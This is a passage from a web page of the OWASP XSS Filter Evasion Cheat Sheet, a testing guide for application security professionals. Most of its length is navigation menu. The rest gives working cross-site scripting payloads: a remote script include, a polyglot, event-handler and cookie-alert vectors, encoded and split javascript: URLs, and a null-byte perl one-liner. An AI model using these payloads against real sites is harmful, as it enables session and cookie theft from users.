          <li class="md-nav__item">
  <a href="#body-image" class="md-nav__link">
    <span class="md-ellipsis">
      BODY Image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-dynsrc" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Dynsrc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-lowsrc" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Lowsrc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-style-image" class="md-nav__link">
    <span class="md-ellipsis">
      List-style-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vbscript-in-an-image" class="md-nav__link">
    <span class="md-ellipsis">
      VBscript in an Image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svg-object-tag" class="md-nav__link">
    <span class="md-ellipsis">
      SVG Object Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ecmascript-6" class="md-nav__link">
    <span class="md-ellipsis">
      ECMAScript 6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#body-tag" class="md-nav__link">
    <span class="md-ellipsis">
      BODY Tag
    </span>
  </a>
  
    <nav class="md-nav" aria-label="BODY Tag">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attacks-using-event-handlers" class="md-nav__link">
    <span class="md-ellipsis">
      Attacks Using Event Handlers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bgsound" class="md-nav__link">
    <span class="md-ellipsis">
      BGSOUND
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript-includes" class="md-nav__link">
    <span class="md-ellipsis">
      &amp; JavaScript includes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE sheet
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remote style sheet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet-part-2" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet part 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-style-sheet-part-3" class="md-nav__link">
    <span class="md-ellipsis">
      Remote style sheet part 3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tags-that-breaks-up-javascript-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tags that Breaks Up JavaScript for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-attribute-that-breaks-up-an-expression" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Attribute that Breaks Up an Expression
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-style-with-expressions" class="md-nav__link">
    <span class="md-ellipsis">
      IMG STYLE with Expressions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tag-using-background-image" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tag using Background-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#style-tag-using-background" class="md-nav__link">
    <span class="md-ellipsis">
      STYLE Tag using Background
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#anonymous-html-with-style-attribute" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous HTML with STYLE Attribute
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#local-htc-file" class="md-nav__link">
    <span class="md-ellipsis">
      Local htc File
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#us-ascii-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      US-ASCII Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#meta" class="md-nav__link">
    <span class="md-ellipsis">
      META
    </span>
  </a>
  
    <nav class="md-nav" aria-label="META">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#meta-using-data" class="md-nav__link">
    <span class="md-ellipsis">
      META using Data
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#meta-with-additional-url-parameter" class="md-nav__link">
    <span class="md-ellipsis">
      META with Additional URL Parameter
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iframe" class="md-nav__link">
    <span class="md-ellipsis">
      IFRAME
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iframe-event-based" class="md-nav__link">
    <span class="md-ellipsis">
      IFRAME Event Based
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#frame" class="md-nav__link">
    <span class="md-ellipsis">
      FRAME
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#table" class="md-nav__link">
    <span class="md-ellipsis">
      TABLE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="TABLE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#td" class="md-nav__link">
    <span class="md-ellipsis">
      TD
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div" class="md-nav__link">
    <span class="md-ellipsis">
      DIV
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DIV">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#div-background-image" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-background-image-with-unicode-xss-exploit" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image with Unicode XSS Exploit
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-background-image-plus-extra-characters" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Background-image Plus Extra Characters
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#div-expression" class="md-nav__link">
    <span class="md-ellipsis">
      DIV Expression
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#downlevel-hidden-block" class="md-nav__link">
    <span class="md-ellipsis">
      Downlevel-Hidden Block
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#base-tag" class="md-nav__link">
    <span class="md-ellipsis">
      BASE Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#object-tag" class="md-nav__link">
    <span class="md-ellipsis">
      OBJECT Tag
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#embed-svg-which-contains-xss-vector" class="md-nav__link">
    <span class="md-ellipsis">
      EMBED SVG Which Contains XSS Vector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-data-island-with-cdata-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      XML Data Island with CDATA Obfuscation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" class="md-nav__link">
    <span class="md-ellipsis">
      Locally hosted XML with embedded JavaScript that is generated using an XML data island
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#htmltime-in-xml" class="md-nav__link">
    <span class="md-ellipsis">
      HTML+TIME in XML
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" class="md-nav__link">
    <span class="md-ellipsis">
      Assuming you can only fit in a few characters and it filters against .js
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssi-server-side-includes" class="md-nav__link">
    <span class="md-ellipsis">
      SSI (Server Side Includes)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#img-embedded-commands" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Embedded Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="IMG Embedded Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
    <span class="md-ellipsis">
      IMG Embedded Commands part II
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cookie-manipulation" class="md-nav__link">
    <span class="md-ellipsis">
      Cookie Manipulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
    <span class="md-ellipsis">
      XSS Using HTML Quote Encapsulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-string-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      URL String Evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="URL String Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ip-versus-hostname" class="md-nav__link">
    <span class="md-ellipsis">
      IP Versus Hostname
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      URL Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dword-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      DWORD Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hex-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Hex Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#octal-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Octal Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#base64-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Base64 Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mixed-encoding" class="md-nav__link">
    <span class="md-ellipsis">
      Mixed Encoding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protocol-resolution-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Protocol Resolution Bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removing-cnames" class="md-nav__link">
    <span class="md-ellipsis">
      Removing CNAMEs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#javascript-link-location" class="md-nav__link">
    <span class="md-ellipsis">
      JavaScript Link Location
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#content-replace-as-attack-vector" class="md-nav__link">
    <span class="md-ellipsis">
      Content Replace as Attack Vector
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assisting-xss-with-http-parameter-pollution" class="md-nav__link">
    <span class="md-ellipsis">
      Assisting XSS with HTTP Parameter Pollution
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Assisting XSS with HTTP Parameter Pollution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#content-page-source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Content Page Source Code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#share-page-source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Share Page Source Code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#content-page-output" class="md-nav__link">
    <span class="md-ellipsis">
      Content Page Output
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#share-page-output" class="md-nav__link">
    <span class="md-ellipsis">
      Share Page Output
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#character-escape-sequences" class="md-nav__link">
    <span class="md-ellipsis">
      Character Escape Sequences
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#methods-to-bypass-waf-cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      Methods to Bypass WAF  Cross-Site Scripting
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Methods to Bypass WAF  Cross-Site Scripting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-issues" class="md-nav__link">
    <span class="md-ellipsis">
      General issues
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General issues">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#stored-xss" class="md-nav__link">
    <span class="md-ellipsis">
      Stored XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-xss-in-javascript" class="md-nav__link">
    <span class="md-ellipsis">
      Reflected XSS in JavaScript
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dom-based-xss" class="md-nav__link">
    <span class="md-ellipsis">
      DOM-based XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss-via-request-redirection" class="md-nav__link">
    <span class="md-ellipsis">
      XSS via request Redirection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#waf-bypass-strings-for-xss" class="md-nav__link">
    <span class="md-ellipsis">
      WAF ByPass Strings for XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      Filter Bypass Alert Obfuscation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="xss-filter-evasion-cheat-sheet">XSS Filter Evasion Cheat Sheet<a class="headerlink" href="#xss-filter-evasion-cheat-sheet" title="Permanent link">&para;</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: <code>http://ha.ckers.org/xss.html</code>. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross Site Scripting Prevention</a>, was inspired by RSnake's work and we thank RSnake for the inspiration!</p>
<h2 id="tests">Tests<a class="headerlink" href="#tests" title="Permanent link">&para;</a></h2>
<p>This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.</p>
<h3 id="basic-xss-test-without-filter-evasion">Basic XSS Test Without Filter Evasion<a class="headerlink" href="#basic-xss-test-without-filter-evasion" title="Permanent link">&para;</a></h3>
<p>This attack, which uses normal XSS JavaScript injection, serves as a baseline for the cheat sheet (the quotes are not required in any modern browser so they are omitted here):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="xss-locator-polyglot">XSS Locator (Polyglot)<a class="headerlink" href="#xss-locator-polyglot" title="Permanent link">&para;</a></h3>
<p>This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:</p>
<div class="highlight"><pre><span></span><code><span class="nx">javascript</span><span class="o">:</span><span class="cm">/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;</span>
<span class="cm">&lt;svg/onload=&#39;+/&quot;`/+/onmouseover=1/+/[*/</span><span class="p">[]</span><span class="o">/+</span><span class="nx">alert</span><span class="p">(</span><span class="mf">42</span><span class="p">);</span><span class="c1">//&#39;&gt;</span>
</code></pre></div>
<p>(Based on this <a href="https://twitter.com/garethheyes/status/997466212190781445">tweet</a> by <a href="https://twitter.com/garethheyes">Gareth Heyes</a>).</p>
<h3 id="malformed-a-tags">Malformed A Tags<a class="headerlink" href="#malformed-a-tags" title="Permanent link">&para;</a></h3>
<p>This test skips the <code>[href](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href)</code> attribute to demonstrate an XSS attack using event handlers:</p>
<div class="highlight"><pre><span></span><code><span class="err">\</span><span class="o">&lt;</span><span class="nx">a</span><span class="w"> </span><span class="nx">onmouseover</span><span class="o">=</span><span class="s2">&quot;alert(document.cookie)&quot;</span><span class="err">\</span><span class="o">&gt;</span><span class="nx">xxs</span><span class="w"> </span><span class="nx">link</span><span class="err">\</span><span class="o">&lt;</span><span class="err">/a\&gt;</span>
</code></pre></div>
<p>Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:</p>
<div class="highlight"><pre><span></span><code><span class="err">\</span><span class="o">&lt;</span><span class="nx">a</span><span class="w"> </span><span class="nx">onmouseover</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="err">\</span><span class="o">&gt;</span><span class="nx">xxs</span><span class="w"> </span><span class="nx">link</span><span class="err">\</span><span class="o">&lt;</span><span class="err">/a\&gt;</span>
</code></pre></div>
<p>(Submitted by David Cross, Verified on Chrome)</p>
<h3 id="malformed-img-tags">Malformed IMG Tags<a class="headerlink" href="#malformed-img-tags" title="Permanent link">&para;</a></h3>
<p>This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="err">&quot;&quot;&quot;</span><span class="p">&gt;&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">)&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>&quot;\&gt;
</code></pre></div>
<p>(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)</p>
<h3 id="fromcharcode">fromCharCode<a class="headerlink" href="#fromcharcode" title="Permanent link">&para;</a></h3>
<p>If the system does not allow quotes of any kind, you can <code>eval()</code> a <code>fromCharCode</code> in JavaScript to create any XSS vector you need:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="default-src-tag-to-get-past-filters-that-check-src-domain">Default SRC Tag to Get Past Filters that Check SRC Domain<a class="headerlink" href="#default-src-tag-to-get-past-filters-that-check-src-domain" title="Permanent link">&para;</a></h3>
<p>This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as <code>onblur</code> or <code>onclick</code>, providing extensive variations of the injections listed here:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">#</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Submitted by David Cross and edited by Abdullah Hussam)</p>
<h3 id="default-src-tag-by-leaving-it-empty">Default SRC Tag by Leaving it Empty<a class="headerlink" href="#default-src-tag-by-leaving-it-empty" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span> <span class="s">onmouseover=&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="default-src-tag-by-leaving-it-out-entirely">Default SRC Tag by Leaving it out Entirely<a class="headerlink" href="#default-src-tag-by-leaving-it-out-entirely" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="on-error-alert">On Error Alert<a class="headerlink" href="#on-error-alert" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">/</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(String.fromCharCode(88,83,83))&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">img</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="img-onerror-and-javascript-alert-encode">IMG onerror and JavaScript Alert Encode<a class="headerlink" href="#img-onerror-and-javascript-alert-encode" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="decimal-html-character-references">Decimal HTML Character References<a class="headerlink" href="#decimal-html-character-references" title="Permanent link">&para;</a></h3>
<p>Since XSS examples that use a <code>javascript:</code> directive inside an <code>&lt;IMG</code> tag do not work on Firefox this approach uses decimal HTML character references as a workaround:</p>
<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="decimal-html-character-references-without-trailing-semicolons">Decimal HTML Character References Without Trailing Semicolons<a class="headerlink" href="#decimal-html-character-references-without-trailing-semicolons" title="Permanent link">&para;</a></h3>
<p>This is often effective in bypassing XSS filters that look for the string <code>&amp;\#XX;</code>, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like <code>$tmp\_string =\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code> which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="hexadecimal-html-character-references-without-trailing-semicolons">Hexadecimal HTML Character References Without Trailing Semicolons<a class="headerlink" href="#hexadecimal-html-character-references-without-trailing-semicolons" title="Permanent link">&para;</a></h3>
<p>This attack is also viable against the filter for the string <code>$tmp\_string=\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code>, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="embedded-tab">Embedded Tab<a class="headerlink" href="#embedded-tab" title="Permanent link">&para;</a></h3>
<p>This approach breaks up the XSS attack:</p>
<!-- markdownlint-disable MD010-->
<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav   ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<!-- markdownlint-enable MD010-->

<h3 id="embedded-encoded-tab">Embedded Encoded Tab<a class="headerlink" href="#embedded-encoded-tab" title="Permanent link">&para;</a></h3>
<p>This approach can also break up XSS:</p>
<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="embedded-newline-to-break-up-xss">Embedded Newline to Break Up XSS<a class="headerlink" href="#embedded-newline-to-break-up-xss" title="Permanent link">&para;</a></h3>
<p>While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the <a href="https://man7.org/linux/man-pages/man7/ascii.7.html">ASCII table</a> for reference. The next four XSS attack examples illustrate this vector:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="example-1-break-up-xss-attack-with-embedded-carriage-return">Example 1: Break Up XSS Attack with Embedded Carriage Return<a class="headerlink" href="#example-1-break-up-xss-attack-with-embedded-carriage-return" title="Permanent link">&para;</a></h4>
<p>(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="example-2-break-up-javascript-directive-with-null">Example 2: Break Up JavaScript Directive with Null<a class="headerlink" href="#example-2-break-up-javascript-directive-with-null" title="Permanent link">&para;</a></h4>
<p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use <code>%00</code> in the URL string or if you want to write your own injection tool you can either use vim (<code>^V^@</code> will produce a null) or the following program to generate it into a text file. The null char <code>%00</code> is much more useful and helped me bypass certain real world filters with a variation on this example:</p>
<div class="highlight"><pre><span></span><code>perl<span class="w"></span>-e<span class="w"></span><span class="s1">&#39;print&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39;</span><span class="w"></span>&gt;<span class="w"></span>out
</code></pre></div>
<h4 id="example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss">Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS<a class="headerlink" href="#example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss" title="Permanent link">&para;</a></h4>
<p>This is useful if a filter's pattern match doesn't take into account spaces in the word <code>javascript:</code>, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the <code>javascript:</code> keyword. The actual reality is you can have any char from 1-32 in decimal:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot; &amp;#14;  javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="example-4-non-alpha-non-digit-xss">Example 4: Non-alpha-non-digit XSS<a class="headerlink" href="#example-4-non-alpha-non-digit-xss" title="Permanent link">&para;</a></h4>
<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
